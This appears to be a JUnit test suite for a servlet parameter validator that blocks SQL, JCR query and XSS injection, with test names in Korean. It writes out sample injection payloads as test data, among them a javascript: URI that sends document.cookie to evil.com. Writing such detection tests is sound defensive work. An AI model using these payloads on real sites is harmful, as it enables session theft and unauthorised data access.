package com.example.security.validators;

import com.example.security.models.ParamRule;
import com.example.security.models.SecurityErrorCode;
import com.example.security.models.ServletPolicyRule;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import javax.servlet.http.HttpServletRequest;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class SqlAndXssValidationTest {

    private ParamPolicyValidator validator;

    @Mock
    private HttpServletRequest request;

    @BeforeEach
    void setUp() {
        validator = new ParamPolicyValidator();
    }

    private ServletPolicyRule createPolicyWithQueryParam() {
        ServletPolicyRule policy = new ServletPolicyRule();
        policy.setTarget("/bin/search/articles");

        ParamRule queryRule = new ParamRule();
        queryRule.setAllowSqlInjection(false);
        queryRule.setAllowXss(false);

        Map<String, ParamRule> params = new HashMap<>();
        params.put("query", queryRule);
        policy.setParams(params);
        policy.setBlockSqlInjection(true);
        policy.setBlockXss(true);
        policy.init();

        return policy;
    }

    @Test
    @DisplayName("정상적인 검색어는 통과")
    void testSafeParamPasses() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"AEM Security Best Practices 2026"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertTrue(result.isValid());
    }

    @Test
    @DisplayName("표준 SQL 인젝션 (' OR '1'='1) 감지 시 400 SEC-40008 차단")
    void testStandardSqlInjectionBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"' OR '1'='1"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals(SecurityErrorCode.PARAM_SQL_INJECTION.getSubCode(), result.getSubCode());
    }

    @Test
    @DisplayName("UNION SELECT SQL 인젝션 차단")
    void testUnionSelectSqlInjectionBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"1 UNION SELECT username, password FROM crx_users--"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals("SEC-40008", result.getSubCode());
    }

    @Test
    @DisplayName("AEM JCR-SQL2 인젝션 (SELECT FROM [nt:base] WHERE ISDESCENDANTNODE) 차단")
    void testJcrSql2InjectionBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"SELECT * FROM [nt:unstructured] WHERE ISDESCENDANTNODE('/home/users')"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals("SEC-40008", result.getSubCode());
    }

    @Test
    @DisplayName("AEM JCR XPath 인젝션 (/jcr:root/content//element(*, cq:Page)) 차단")
    void testXPathInjectionBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"/jcr:root/content//element(*, cq:Page)[@jcr:primaryType]"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals("SEC-40008", result.getSubCode());
    }

    @Test
    @DisplayName("표준 <script> XSS 태그 주입 시 400 SEC-40009 차단")
    void testScriptTagXssBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"<script>alert('XSS Attack');</script>"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals(SecurityErrorCode.PARAM_XSS.getSubCode(), result.getSubCode());
    }

    @Test
    @DisplayName("인라인 이벤트 핸들러 (<img src=x onerror=alert(document.cookie)>) XSS 차단")
    void testInlineEventHandlerXssBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"<img src=\"dummy.jpg\" onerror=\"alert(document.cookie)\"/>"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals("SEC-40009", result.getSubCode());
    }

    @Test
    @DisplayName("javascript: 가상 스키마 XSS 차단")
    void testJavascriptPseudoSchemeBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"javascript:document.location='http://evil.com?c='+document.cookie"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals("SEC-40009", result.getSubCode());
    }

    @Test
    @DisplayName("HTML 엔티티 인코딩 (&lt;script&gt;) 우회 XSS 차단")
    void testHtmlEntityEncodedXssBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"&lt;script&gt;alert(1)&lt;/script&gt;"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals("SEC-40009", result.getSubCode());
    }

    @Test
    @DisplayName("파라미터에 allowSqlInjection=true 명시 시 SQLi 예외 허용")
    void testAllowSqlInjectionExplicitlyPermits() {
        ServletPolicyRule policy = new ServletPolicyRule();
        policy.setTarget("/bin/dev/sql-console");

        ParamRule sqlParam = new ParamRule();
        sqlParam.setAllowSqlInjection(true); // 명시적 허용!

        Map<String, ParamRule> params = new HashMap<>();
        params.put("sql", sqlParam);
        policy.setParams(params);
        policy.init();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("sql", new String[]{"SELECT * FROM crx_nodes WHERE id = 1"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertTrue(result.isValid());
    }

    @Test
    @DisplayName("고속 검증 패스: 특수문자가 없는 순수 영숫자 정상 파라미터는 즉시 통과")
    void testCleanAlphanumericFastPathPasses() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"ProductItem12345"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertTrue(result.isValid());
    }

    @Test
    @DisplayName("Time-based Blind SQLi (SLEEP(5)) 탐지 시 차단")
    void testTimeBasedBlindSqlInjectionBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"1; SLEEP(5)--"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals("SEC-40008", result.getSubCode());
    }

    @Test
    @DisplayName("DOM 조작 XSS (eval(alert(1))) 탐지 시 차단")
    void testEvalFunctionXssBlocked() {
        ServletPolicyRule policy = createPolicyWithQueryParam();

        Map<String, String[]> paramMap = new HashMap<>();
        paramMap.put("query", new String[]{"eval('alert(1)')"});
        when(request.getParameterMap()).thenReturn(paramMap);

        ValidationResult result = validator.validate(request, policy, null);
        assertFalse(result.isValid());
        assertEquals(400, result.getStatusCode());
        assertEquals("SEC-40009", result.getSubCode());
    }
}
